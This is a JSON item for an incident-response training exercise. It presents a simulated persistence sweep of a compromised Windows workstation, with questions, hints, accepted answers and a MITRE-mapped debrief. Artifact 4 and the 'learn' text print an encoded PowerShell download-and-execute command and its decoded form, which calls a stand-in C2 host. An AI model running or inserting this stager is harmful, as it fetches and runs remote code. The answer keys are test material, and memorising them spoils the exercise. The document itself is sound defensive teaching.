@@ -1,0 +1,85 @@
+{
+  "id": "case19",
+  "title": "Persistence Sweep",
+  "stage": "stage4",
+  "difficulty": 4,
+  "xp_base": 250,
+  "tools_type": "timeline_builder",
+  "scenario": "Before the incident can be declared remediated, your team must identify and eradicate every persistence mechanism the attacker installed. A thorough persistence sweep has been completed on WKSTN-047 (patient zero) using Sysinternals Autoruns and manual registry analysis. Missing even one persistence mechanism means the attacker can regain access the moment the machine is brought back online. Count every distinct persistence mechanism found.",
+  "challenge": "How many distinct persistence mechanisms did the attacker deploy?",
+  "challenge_data": "PERSISTENCE ARTIFACT SWEEP — WKSTN-047\n========================================\nTool     : Sysinternals Autoruns v14.11 + manual analysis\nHost     : WKSTN-047 (j.park workstation)\nDate     : 2026-04-02 08:00:00 UTC\nAnalyst  : J. Rivera\n\n[ARTIFACT 1 — Registry Run Key]\n---------------------------------\nLocation  : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue Name: WindowsUpdateHelper\nValue Data: C:\\Windows\\Temp\\update.dat /silent /persist\nCreated   : 2026-03-31 21:45:03 UTC\nStatus    : CONFIRMED MALICIOUS\nMITRE     : T1547.001 (Registry Run Keys / Startup Folder)\n\n[ARTIFACT 2 — Scheduled Task]\n------------------------------\nTask Name : \\Microsoft\\Windows\\Update\\TaskHandler\nExecutable: C:\\Windows\\Temp\\update.dat\nArguments : /persist\nTrigger 1 : At system startup\nTrigger 2 : At logon (all users)\nTrigger 3 : Every 15 minutes (repeat indefinitely)\nAuthor    : SYSTEM\nCreated   : 2026-03-31 21:47:03 UTC\nXML Path  : C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Update\\TaskHandler\nStatus    : CONFIRMED MALICIOUS\nMITRE     : T1053.005 (Scheduled Task/Job: Scheduled Task)\n\n[ARTIFACT 3 — User Startup Folder]\n------------------------------------\nPath      : C:\\Users\\j.park\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUpdate.lnk\nLink Type : .lnk (Windows Shortcut)\nTarget    : C:\\Windows\\Temp\\update.dat\nArguments : /silent\nCreated   : 2026-03-31 21:49:22 UTC\nStatus    : CONFIRMED MALICIOUS\nMITRE     : T1547.001 (Registry Run Keys / Startup Folder)\n\n[ARTIFACT 4 — WMI Event Subscription]\n---------------------------------------\nNamespace  : root\\subscription\nFilter Name: ProcessWatcher\nFilter Query: SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'\nConsumer   : CommandLineEventConsumer (MaliciousConsumer)\nConsumer Command: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC0AcABhAG4AZQBsAC4AZABhAHIAawBoAG8AcwB0AGkAbgBnAC4AcgB1AC8AcABhAHkAbABvAGEAZAAnACkA\nTrigger    : Executes when explorer.exe starts (user login)\nCreated    : 2026-03-31 21:52:11 UTC\nDisk File  : None (fileless — stored entirely in WMI repository)\nStatus     : CONFIRMED MALICIOUS\nMITRE      : T1546.003 (Event Triggered Execution: Windows Management Instrumentation)\n\n============================================\nPERSISTENCE SWEEP SUMMARY\n============================================\nTotal Artifacts Found : 4\nAll Artifacts Status  : CONFIRMED MALICIOUS\nAll point to         : C:\\Windows\\Temp\\update.dat (primary payload)\n                       OR encoded PowerShell downloading from c2-panel.darkhosting[.]ru\n\nRemediation Required:\n  1. Delete registry value: HKCU\\...\\Run\\WindowsUpdateHelper\n  2. Remove scheduled task: TaskHandler from Task Scheduler\n  3. Delete startup LNK: C:\\Users\\j.park\\...\\Startup\\WinUpdate.lnk\n  4. Remove WMI subscription (Get-WMIObject + Remove-WMIObject or wmic)\n  5. Delete C:\\Windows\\Temp\\update.dat (primary payload)\n  6. Delete C:\\Users\\Public\\svch0st.exe (initial dropper)\n  7. Reimage recommended for full assurance",
+  "valid_answers": ["4", "four", "4 mechanisms", "four mechanisms", "4 persistence mechanisms", "four persistence mechanisms", "four distinct persistence mechanisms"],
+  "steps": [
+    {
+      "question": "Which of the four persistence mechanisms is fileless — stored entirely without a file on disk?",
+      "valid_answers": ["wmi", "wmi event subscription", "artifact 4", "wmi subscription", "windows management instrumentation", "wmi event subscription artifact 4"],
+      "hints": [
+        "Read each artifact description and look for the one that explicitly says it has no file on disk.",
+        "Three of the four artifacts point to a file on disk (update.dat or a .lnk shortcut). One artifact's 'Disk File' field reads 'None'.",
+        "ARTIFACT 4 — WMI Event Subscription — has the entry 'Disk File: None (fileless — stored entirely in WMI repository)'. This makes it the hardest to detect with traditional file-scanning tools.",
+        "Artifact 4 (WMI Event Subscription) is the fileless mechanism. Its command is stored as a WMI object in the WMI repository (C:\\Windows\\System32\\wbem\\Repository\\), not as a file on disk — so file hash scanning and directory scans won't find it."
+      ],
+      "wrong_answer_hints": [
+        {"pattern": "registry", "response": "The Registry Run Key (Artifact 1) executes update.dat — that is a file on disk. Look for the artifact explicitly labeled 'fileless'."},
+        {"pattern": "scheduled task", "response": "The Scheduled Task (Artifact 2) also executes update.dat from disk, and stores its definition as an XML file in C:\\Windows\\System32\\Tasks\\. Look for the artifact with 'Disk File: None'."}
+      ]
+    },
+    {
+      "question": "How many different trigger conditions does the Scheduled Task (Artifact 2) use?",
+      "valid_answers": ["3", "three", "3 triggers", "three triggers", "triple trigger"],
+      "hints": [
+        "Look at the Scheduled Task entry (ARTIFACT 2) and count the 'Trigger' lines listed under it.",
+        "The scheduled task has Trigger 1, Trigger 2, and Trigger 3 listed. Count them.",
+        "The three triggers are: Trigger 1 (At system startup), Trigger 2 (At logon for all users), and Trigger 3 (Every 15 minutes, indefinitely). Having multiple triggers ensures the payload executes frequently.",
+        "The Scheduled Task has 3 trigger conditions — startup, logon, and every 15 minutes. This triple-trigger design means the malware executes at boot, whenever any user logs in, AND every 15 minutes while running — making it the most persistent artifact in terms of execution frequency."
+      ],
+      "wrong_answer_hints": [
+        {"pattern": "1", "response": "Look at the Scheduled Task artifact carefully — it lists multiple trigger lines (Trigger 1, Trigger 2, Trigger 3). Count all of them."},
+        {"pattern": "2", "response": "There are more than 2 triggers. Look at all the 'Trigger N :' lines listed under ARTIFACT 2 and count each one."}
+      ]
+    },
+    {
+      "question": "How many distinct persistence mechanisms did the attacker deploy?",
+      "valid_answers": ["4", "four", "4 mechanisms", "four mechanisms", "4 persistence mechanisms", "four persistence mechanisms", "four distinct persistence mechanisms"],
+      "hints": [
+        "Read through the sweep report carefully and count each numbered artifact. Each [ARTIFACT N] section represents a separate, distinct persistence mechanism.",
+        "The report lists artifacts numbered 1 through 4. Each one uses a different Windows persistence technique to ensure the malware survives reboots even if some are discovered and removed.",
+        "The four techniques are: Registry Run Key (Artifact 1), Scheduled Task (Artifact 2), Startup Folder shortcut (Artifact 3), and WMI Event Subscription (Artifact 4). Each is a different persistence location.",
+        "The summary at the bottom explicitly states 'Total Artifacts Found: 4'. The attacker deployed 4 distinct persistence mechanisms to maximize survival. The answer is 4."
+      ],
+      "wrong_answer_hints": [
+        {"pattern": "3", "response": "There is a fourth artifact — the WMI Event Subscription — which is easy to miss since it is fileless and often overlooked. Check the full numbered artifact list."},
+        {"pattern": "2", "response": "The report identifies more than two persistence mechanisms. Read through each [ARTIFACT N] section and count them — there are more than you may expect."},
+        {"pattern": "1", "response": "The attacker deployed multiple redundant persistence mechanisms to ensure reaccess. Read through all the [ARTIFACT N] numbered sections and count each distinct technique."}
+      ]
+    },
+    {
+      "question": "What encoded command technique does the WMI Event Subscription use to hide its payload?",
+      "valid_answers": ["base64", "base64 encoding", "powershell -enc", "powershell encoded command", "-enc flag", "encoded powershell", "base 64"],
+      "hints": [
+        "Look at the 'Consumer Command' line in ARTIFACT 4. The PowerShell command includes a flag that indicates the command itself is encoded rather than readable plain text.",
+        "The PowerShell command uses the flag '-Enc' followed by a long string of characters. '-Enc' (or '-EncodedCommand') tells PowerShell to execute a Base64-encoded command.",
+        "The command is: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...' — the -Enc flag means the long string that follows is a Base64-encoded PowerShell command.",
+        "The technique is Base64 encoding via PowerShell's -Enc (-EncodedCommand) parameter. Decoded, the command is: IEX (New-Object Net.WebClient).DownloadString('http://c2-panel.darkhosting.ru/payload') — a download-and-execute stager."
+      ],
+      "wrong_answer_hints": [
+        {"pattern": "xor", "response": "XOR is a different obfuscation technique not shown here. Look at the PowerShell flags in the Consumer Command — one of them indicates a specific encoding format."},
+        {"pattern": "hex", "response": "The long string after -Enc is not hex encoding. The -Enc PowerShell flag stands for a different common encoding format."}
+      ]
+    }
+  ],
+  "hints": [
+    "Read through the sweep report carefully and count each numbered artifact. Each [ARTIFACT N] section represents a separate, distinct persistence mechanism.",
+    "The report lists artifacts numbered 1 through 4. Each one uses a different Windows persistence technique to ensure the malware survives reboots even if some are discovered and removed.",
+    "The four techniques are: Registry Run Key (Artifact 1), Scheduled Task (Artifact 2), Startup Folder shortcut (Artifact 3), and WMI Event Subscription (Artifact 4). Each is a different persistence location.",
+    "The summary at the bottom explicitly states 'Total Artifacts Found: 4'. The attacker deployed 4 distinct persistence mechanisms to maximize survival. The answer is 4."
+  ],
+  "learn": "Sophisticated threat actors rarely rely on a single persistence mechanism. By deploying multiple redundant persistence techniques, they ensure that if an analyst discovers and removes one, the others will re-execute the payload at the next system event or reboot. This is why a thorough persistence sweep is mandatory before declaring an incident remediated.\n\nThe four persistence techniques found:\n\n1. Registry Run Key (T1547.001)\nLocation: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nTrigger: Every time the user logs in\nDetection: Autoruns, Regedit, RegRipper\n\n2. Scheduled Task (T1053.005)\nLocation: C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Update\\TaskHandler\nTrigger: Startup, logon, AND every 15 minutes (triple trigger — most aggressive)\nDetection: Autoruns, schtasks /query, Task Scheduler GUI, Event ID 4698\nNote: Malicious scheduled tasks often hide under Microsoft subdirectories to look legitimate\n\n3. Startup Folder Shortcut (T1547.001)\nLocation: C:\\Users\\[user]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\nTrigger: Every time the user logs in (same as Run key — belt AND suspenders)\nDetection: Autoruns, manual folder inspection\nSystem-wide startup: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\n\n4. WMI Event Subscription (T1546.003)\nLocation: WMI repository (C:\\Windows\\System32\\wbem\\Repository\\)\nTrigger: When explorer.exe starts (equivalent to user logon)\nStealth: Fileless — no binary on disk, all logic stored in the WMI object store\nDetection: Get-WMIObject -Namespace root\\subscription -Class __EventFilter, Autoruns\nRemoval: Remove-WMIObject or wmic subscription delete\n\nWhy WMI subscriptions are the stealthiest:\n- Fileless: No executable on disk to detect with antivirus\n- Survives reimaging if only the OS drive is wiped (rare edge case with WMI repository backup)\n- Many legacy AV products do not monitor WMI subscriptions\n- Encoded PowerShell command hides the actual payload\n\nThe base64 encoded PowerShell in Artifact 4 decodes to:\nIEX (New-Object Net.WebClient).DownloadString('http://c2-panel.darkhosting.ru/payload')\n(IEX = Invoke-Expression — downloads and executes the payload from C2)\n\nSysinternals Autoruns checks all of the following persistence locations automatically:\nRun keys, Services, Scheduled Tasks, Startup folders, WMI subscriptions, Browser extensions, AppInit DLLs, Winlogon entries, Image File Execution Options, COM objects, LSA providers, and dozens more.\n\nFor enterprise-scale hunting: Velociraptor, KAPE, and EDR platforms can query all endpoints simultaneously for persistence artifacts.",
+  "debrief": {
+    "summary": "The attacker deployed 4 distinct persistence mechanisms on WKSTN-047: a Registry Run key, a Scheduled Task with three triggers (startup, logon, and every 15 minutes), a startup folder shortcut, and a WMI event subscription. The WMI subscription is fileless, making it the most difficult to detect and remove. All four point to the same payload (update.dat or a PowerShell download stager).",
+    "real_world": "Multilayered persistence is standard practice for sophisticated threat actors including ransomware groups. Incident responders must check all persistence locations — not just the obvious ones — before returning a system to production. Running Autoruns across all affected hosts is a mandatory step in enterprise remediation.",
+    "next_step": "Perform the same 4-point persistence sweep on all 14 other affected servers, not just patient zero, since PsExec lateral movement may have planted the same or additional mechanisms on each. Given the WMI fileless persistence, consider reimaging all affected hosts for full assurance.",
+    "cert_link": "CySA+ CS0-003 Domain 4 (Security Operations), GCFA, GCFE",
+    "exam_tip": "WMI event subscriptions are the stealthiest Windows persistence — fileless, stored in the WMI repository, survives many cleanup attempts. Sysinternals Autoruns is the gold standard persistence sweep tool. Know the four common locations: Registry Run keys, Scheduled Tasks, Startup folders, WMI subscriptions. MITRE T1547 and T1546."
+  }
+}
